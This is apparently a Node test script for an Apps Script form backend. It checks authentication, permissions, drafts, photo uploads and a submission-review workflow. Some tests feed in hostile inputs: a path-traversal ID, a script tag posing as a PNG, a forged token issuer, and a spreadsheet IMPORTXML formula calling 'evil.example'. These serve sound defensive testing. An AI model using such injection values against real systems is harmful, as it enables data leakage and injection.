// Runs apps-script/Code.gs in Node against in-memory fakes of the Apps Script
// services (Sheets, Drive, token verification, cache, lock) and checks the API's
// authentication, permission, draft, upload and review rules.
// Usage: node apps-script/test/run-tests.mjs
import { createHash, randomUUID } from 'node:crypto'
import { makeEnv } from './fakes.mjs'

const OWNER = 'owner@example.com'
const DEV = 'dev@example.com'

/* ---------------- test runner ---------------- */
const results = []
function test(name, fn) {
  try {
    fn()
    results.push(['PASS', name])
  } catch (err) {
    results.push(['FAIL', name, err.message])
  }
}
function eq(actual, expected, msg) {
  if (JSON.stringify(actual) !== JSON.stringify(expected)) {
    throw new Error(`${msg || 'mismatch'}: expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`)
  }
}
const errCode = (res) => (res.ok ? 'OK' : res.error.code)

const PNG = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
  'base64',
)
const sha = (buf) => createHash('sha256').update(buf).digest('hex')

function validForm(images = []) {
  return {
    schemaVersion: 1,
    business: { businessName: 'VISAT INSTRUMENTS', contactPerson: 'Manish Solanki', phone: '+91 99138 13861', address: 'Chandlodiya, Ahmedabad' },
    products: [
      {
        id: 'PRD-abc12345', name: 'Digital Weighing Indicator', category: 'Digital Weighing Indicators', imageCategory: 'indicators',
        specifications: [{ id: 'SPEC-1', label: 'Display', value: 'Red LED' }], images,
      },
    ],
    services: [{ id: 'SVC-1', type: 'Installation', offered: 'yes' }],
    weighbridge: {}, highlights: {}, feedback: { overallRating: '5' },
  }
}

/* ---------------- setup ---------------- */
const env = makeEnv({ owners: ` ${OWNER.toUpperCase()} `, developers: DEV }) // spacing and case test normalisation
env.context.setup()
const ss = env.sheetsById[env.props.SPREADSHEET_ID]
const root = env.folders[env.props.ROOT_FOLDER_ID]

test('setup creates all sheets with headers and removes Sheet1', () => {
  const names = Object.keys(ss.sheets).sort()
  eq(names, ['Business_Profile', 'Drafts', 'File_References', 'Product_Specifications', 'Products', 'Services', 'Submissions', 'Website_Feedback', 'Weighbridge'])
  eq(ss.sheets.Drafts.rows[0][0], 'formId')
})
test('setup creates the Drive folder tree, private and shared with allowlisted users', () => {
  const tree = root.children.map((c) => `${c.name}[${c.children.map((g) => g.name).join(',')}]`)
  eq(tree, ['Owner-Submissions[Drafts,Submitted]', 'Product-Images[Weighing-Scales,Indicators,Junction-Boxes,Weighbridges,Other]', 'Business-Documents[]'])
  eq(root.sharing, ['PRIVATE', 'NONE'])
  eq(root.viewers.sort(), [DEV, OWNER])
})
test('setup is safe to run twice (no duplicate folders)', () => {
  env.context.setup()
  eq(root.children.length, 3)
  eq(root.children[1].children.length, 5)
})

/* ---------------- authentication ---------------- */
const ownerTok = env.issueToken(OWNER)
const devTok = env.issueToken(DEV)

test('missing token is rejected', () => eq(errCode(env.call('whoami', undefined)), 'UNAUTHENTICATED'))
test('token Google rejects is rejected', () => eq(errCode(env.call('whoami', 'x'.repeat(40))), 'UNAUTHENTICATED'))
test('token for another app (wrong audience) is rejected', () =>
  eq(errCode(env.call('whoami', env.issueToken(OWNER, { aud: 'other-app' }))), 'UNAUTHENTICATED'))
test('expired token is rejected', () =>
  eq(errCode(env.call('whoami', env.issueToken(OWNER, { exp: String(Math.floor(Date.now() / 1000) - 10) }))), 'UNAUTHENTICATED'))
test('unverified email is rejected', () =>
  eq(errCode(env.call('whoami', env.issueToken(OWNER, { email_verified: 'false' }))), 'UNAUTHENTICATED'))
test('wrong issuer is rejected', () =>
  eq(errCode(env.call('whoami', env.issueToken(OWNER, { iss: 'evil.example.com' }))), 'UNAUTHENTICATED'))
test('valid Google account not on the allowlist is forbidden', () =>
  eq(errCode(env.call('whoami', env.issueToken('stranger@gmail.com'))), 'FORBIDDEN'))
test('owner identified with role (allowlist is case/space-insensitive)', () => {
  const r = env.call('whoami', ownerTok)
  eq([r.ok, r.data.email, r.data.isOwner, r.data.isDeveloper], [true, OWNER, true, false])
})
test('verified token is cached (Google not called again)', () => {
  const before = env.stats.tokenFetches
  env.call('whoami', ownerTok)
  eq(env.stats.tokenFetches, before)
})
test('unknown action is rejected', () => eq(errCode(env.call('admin.dropAll', ownerTok)), 'UNKNOWN_ACTION'))
test('malformed body is rejected', () => {
  const out = JSON.parse(env.context.doPost({ postData: { contents: 'not json' } }).content)
  eq(errCode(out), 'BAD_REQUEST')
})

/* ---------------- drafts ---------------- */
const formId = 'FRM-' + randomUUID()
let revision = 0

test('developer cannot create drafts', () =>
  eq(errCode(env.call('draft.save', devTok, { formId, baseRevision: 0, data: validForm() })), 'FORBIDDEN'))
test('invalid form ID is rejected', () =>
  eq(errCode(env.call('draft.save', ownerTok, { formId: '../../etc', baseRevision: 0, data: {} })), 'BAD_REQUEST'))
test('owner creates a draft (revision 1, Drive JSON copy)', () => {
  const r = env.call('draft.save', ownerTok, { formId, baseRevision: 0, data: { business: { businessName: 'VISAT' } } })
  eq([r.ok, r.data.revision, r.data.status], [true, 1, 'DRAFT'])
  revision = r.data.revision
  const draftsFolder = root.children[0].children[0]
  eq(Object.values(env.files).filter((f) => f.folder === draftsFolder).length, 1)
})
test('saving again updates the same draft row and file (no duplicates)', () => {
  const r = env.call('draft.save', ownerTok, { formId, baseRevision: revision, data: { business: { businessName: 'VISAT INSTRUMENTS' } } })
  eq([r.ok, r.data.revision], [true, 2])
  revision = 2
  eq(ss.sheets.Drafts.rows.length, 2) // header + 1
  const draftsFolder = root.children[0].children[0]
  eq(Object.values(env.files).filter((f) => f.folder === draftsFolder).length, 1)
})
test('retried save with the same request ID is not applied twice', () => {
  const rid = randomUUID()
  const a = env.call('draft.save', ownerTok, { formId, baseRevision: revision, data: validForm() }, rid)
  const b = env.call('draft.save', ownerTok, { formId, baseRevision: revision, data: validForm() }, rid)
  eq([a.data.revision, b.ok, b.data.revision], [3, true, 3])
  revision = 3
})
test('stale revision is rejected as a conflict', () => {
  const r = env.call('draft.save', ownerTok, { formId, baseRevision: 1, data: validForm() })
  eq([errCode(r), r.error.details.revision], ['CONFLICT', 3])
})
test('unknown keys and oversize strings are stripped server-side', () => {
  const r = env.call('draft.save', ownerTok, {
    formId, baseRevision: revision,
    data: { ...validForm(), evil: 'x', business: { businessName: 'A'.repeat(500), __proto__x: 1 } },
  })
  revision = r.data.revision
  const got = env.call('draft.get', ownerTok, { formId }).data.data
  eq([got.evil, got.business.businessName.length, got.business.__proto__x], [undefined, 120, undefined])
})
test('another allowlisted owner cannot read or overwrite this draft', () => {
  env.props.OWNER_EMAILS += ',second@example.com'
  const other = env.issueToken('second@example.com')
  eq(errCode(env.call('draft.get', other, { formId })), 'NOT_FOUND')
  eq(errCode(env.call('draft.save', other, { formId, baseRevision: revision, data: validForm() })), 'FORBIDDEN')
  eq(env.call('draft.list', other).data.length, 0)
})
test('developer can list and read drafts', () => {
  eq(env.call('draft.list', devTok).data.map((d) => d.formId), [formId])
  eq(env.call('draft.get', devTok, { formId }).ok, true)
})

/* ---------------- images ---------------- */
let imageRef
const upload = (tok, over = {}) =>
  env.call('image.upload', tok, {
    formId, productId: 'PRD-abc12345', imageCategory: 'indicators', fileName: 'front.png', mimeType: 'image/png',
    sha256: sha(PNG), base64: PNG.toString('base64'), ...over,
  })

test('developer cannot upload photos', () => eq(errCode(upload(devTok)), 'FORBIDDEN'))
test('disallowed MIME type is rejected', () => eq(errCode(upload(ownerTok, { mimeType: 'application/pdf' })), 'INVALID_FILE'))
test('content that does not match the declared type is rejected', () =>
  eq(errCode(upload(ownerTok, { mimeType: 'image/jpeg' })), 'INVALID_FILE'))
test('non-image bytes disguised as PNG are rejected', () => {
  const fake = Buffer.from('<script>alert(1)</script>')
  eq(errCode(upload(ownerTok, { base64: fake.toString('base64'), sha256: sha(fake) })), 'INVALID_FILE')
})
test('oversize file is rejected', () => {
  const big = Buffer.concat([PNG, Buffer.alloc(5 * 1024 * 1024)])
  eq(errCode(upload(ownerTok, { base64: big.toString('base64'), sha256: sha(big) })), 'INVALID_FILE')
})
test('corrupted upload (hash mismatch) is rejected', () => eq(errCode(upload(ownerTok, { sha256: 'a'.repeat(64) })), 'INVALID_FILE'))
test('invalid product ID is rejected', () => eq(errCode(upload(ownerTok, { productId: 'nope' })), 'BAD_REQUEST'))
test('valid photo is stored in the category folder with a unique name and recorded', () => {
  const r = upload(ownerTok)
  eq([r.ok, r.data.duplicate], [true, false])
  imageRef = r.data
  const file = env.files[imageRef.fileId]
  eq(file.folder.name, 'Indicators')
  eq(/^PRD-abc12345_\d{8}-\d{6}_[0-9a-f]{10}\.png$/.test(file.name), true)
  eq(ss.sheets.File_References.rows.length, 2)
})
test('re-uploading the same photo returns the existing file (no duplicate)', () => {
  const r = upload(ownerTok)
  eq([r.data.fileId, r.data.duplicate], [imageRef.fileId, true])
  eq(ss.sheets.File_References.rows.length, 2)
})
test('owner and developer can fetch the photo; a stranger owner cannot', () => {
  eq(env.call('image.get', ownerTok, { fileId: imageRef.fileId }).data.base64, PNG.toString('base64'))
  eq(env.call('image.get', devTok, { fileId: imageRef.fileId }).ok, true)
  eq(errCode(env.call('image.get', env.issueToken('second@example.com'), { fileId: imageRef.fileId })), 'NOT_FOUND')
})

/* ---------------- submission & review ---------------- */
let reference
test('incomplete form fails server-side validation', () => {
  const bad = validForm()
  bad.business.phone = '123'
  bad.products[0].name = ''
  const r = env.call('submission.submit', ownerTok, { formId, baseRevision: revision, data: bad })
  eq(errCode(r), 'VALIDATION_FAILED')
  eq(r.error.details.errors.length >= 2, true)
})
test('submission referencing a photo that was never uploaded is rejected', () => {
  const r = env.call('submission.submit', ownerTok, {
    formId, baseRevision: revision, data: validForm([{ fileId: 'fileDoesNotExist123', name: 'x.png' }]),
  })
  eq(errCode(r), 'PENDING_UPLOADS')
})
test('valid submission gets a reference, version 1 and normalised rows', () => {
  const rid = randomUUID()
  const data = validForm([{ fileId: imageRef.fileId, name: 'front.png' }])
  data.products[0].description = '=IMPORTXML("http://evil.example","//a")'
  const r = env.call('submission.submit', ownerTok, { formId, baseRevision: revision, data }, rid)
  eq([r.ok, r.data.status, r.data.version], [true, 'SUBMITTED', 1])
  eq(/^VI-\d{8}-[A-Z2-9]{5}$/.test(r.data.reference), true)
  reference = r.data.reference
  eq(ss.sheets.Products.rows.length, 2)
  eq(ss.sheets.Product_Specifications.rows.length, 2)
  eq(ss.sheets.Services.rows.length, 2)
  eq(ss.sheets.Products.rows[1][15], imageRef.fileId)
  eq(ss.sheets.Products.rows[1][8], `'=IMPORTXML("http://evil.example","//a")`, 'formula text must be escaped in Sheets')
  // retry of the same request returns the same result without new rows
  const again = env.call('submission.submit', ownerTok, { formId, baseRevision: revision, data }, rid)
  eq([again.ok, again.data.version, ss.sheets.Products.rows.length], [true, 1, 2])
})
test('submitted form is locked for edits, uploads and photo removal', () => {
  const rev = env.call('draft.get', ownerTok, { formId }).data.revision
  eq(errCode(env.call('draft.save', ownerTok, { formId, baseRevision: rev, data: validForm() })), 'LOCKED')
  eq(errCode(upload(ownerTok, { productId: 'PRD-new12345' })), 'LOCKED')
  eq(errCode(env.call('image.remove', ownerTok, { fileId: imageRef.fileId })), 'LOCKED')
})
test('owner cannot change review status', () =>
  eq(errCode(env.call('submission.setStatus', ownerTok, { formId, status: 'APPROVED' })), 'FORBIDDEN'))
test('developer moves submission to UNDER_REVIEW', () =>
  eq(env.call('submission.setStatus', devTok, { formId, status: 'UNDER_REVIEW' }).data.status, 'UNDER_REVIEW'))
test('invalid transition is rejected', () =>
  eq(errCode(env.call('submission.setStatus', devTok, { formId, status: 'DRAFT' })), 'INVALID_TRANSITION'))
test('requesting changes requires a note', () =>
  eq(errCode(env.call('submission.setStatus', devTok, { formId, status: 'CHANGES_REQUESTED' })), 'BAD_REQUEST'))
test('developer requests changes; owner can edit again and resubmit as version 2', () => {
  const r = env.call('submission.setStatus', devTok, { formId, status: 'CHANGES_REQUESTED', note: 'Add capacity' })
  eq(r.data.status, 'CHANGES_REQUESTED')
  const draft = env.call('draft.get', ownerTok, { formId }).data
  eq(draft.status, 'CHANGES_REQUESTED')
  const data = validForm([{ fileId: imageRef.fileId, name: 'front.png' }])
  data.products[0].capacity = '100 kg'
  const saved = env.call('draft.save', ownerTok, { formId, baseRevision: draft.revision, data })
  eq(saved.ok, true)
  const sub = env.call('submission.submit', ownerTok, { formId, baseRevision: saved.data.revision, data })
  eq([sub.data.version, sub.data.reference], [2, reference])
  eq(ss.sheets.Products.rows.length, 3) // v1 row kept as history + v2 row
})
test('submission history records every status change', () => {
  const r = env.call('submission.get', ownerTok, { formId })
  eq(r.data.history.map((h) => h.status), ['SUBMITTED', 'UNDER_REVIEW', 'CHANGES_REQUESTED', 'SUBMITTED'])
  eq(r.data.data.products[0].capacity, '100 kg')
})
test('developer approves', () => {
  env.call('submission.setStatus', devTok, { formId, status: 'UNDER_REVIEW' })
  eq(env.call('submission.setStatus', devTok, { formId, status: 'APPROVED' }).data.status, 'APPROVED')
})
test('submission lists respect ownership', () => {
  eq(env.call('submission.list', ownerTok).data.length, 1)
  eq(env.call('submission.list', devTok).data.length, 1)
  eq(env.call('submission.list', env.issueToken('second@example.com')).data.length, 0)
})
test('a JSON snapshot is saved in Drive for each submitted version', () => {
  const submitted = root.children[0].children[1]
  eq(Object.values(env.files).filter((f) => f.folder === submitted).map((f) => f.name).sort(), [`${reference}-v1.json`, `${reference}-v2.json`])
})

/* ---------------- report ---------------- */
for (const [status, name, msg] of results) console.log(`${status}  ${name}${msg ? `\n      ${msg}` : ''}`)
const failed = results.filter((r) => r[0] === 'FAIL').length
console.log(`\n${results.length - failed}/${results.length} passed`)
process.exit(failed ? 1 : 0)
